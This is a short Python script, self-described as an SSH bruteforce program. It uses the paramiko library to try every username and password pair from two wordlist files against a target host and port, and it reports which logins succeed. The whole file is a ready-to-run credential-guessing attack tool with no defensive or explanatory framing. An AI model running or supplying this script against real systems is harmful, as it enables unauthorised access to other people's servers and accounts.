#!/usr/bin/env python3

import paramiko
import argparse
import socket

parser = argparse.ArgumentParser(description='SSH bruteforce program')
parser.add_argument('-u','--usernames', help='usernames file')
parser.add_argument('-p','--passwords', help='passwords file')
parser.add_argument('-s','--host', help='Host IP address')
parser.add_argument('-k','--port', help='port (default 22)',default=22)
args = vars(parser.parse_args())

usernames = []
passwords = []

#get username and passwords from list
if args['usernames']:
	f = open(args['usernames'],"r")
	for user in f.readlines():
		usernames.append(user.strip("\n"))

if args['passwords']:
	f = open(args['passwords'],"r")
	for passw in f.readlines():
		passwords.append(passw.strip("\n"))

#connect to SSH

port = 22
host,port = args['host'],args['port']

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for user in usernames:
	for password in passwords:
		try:
			ssh.connect(host,port,user,password)
			print("'%s':'%s' succeeded!." % (user, password))

		except paramiko.AuthenticationException:
			print("'%s':'%s' failed." % (user, password))
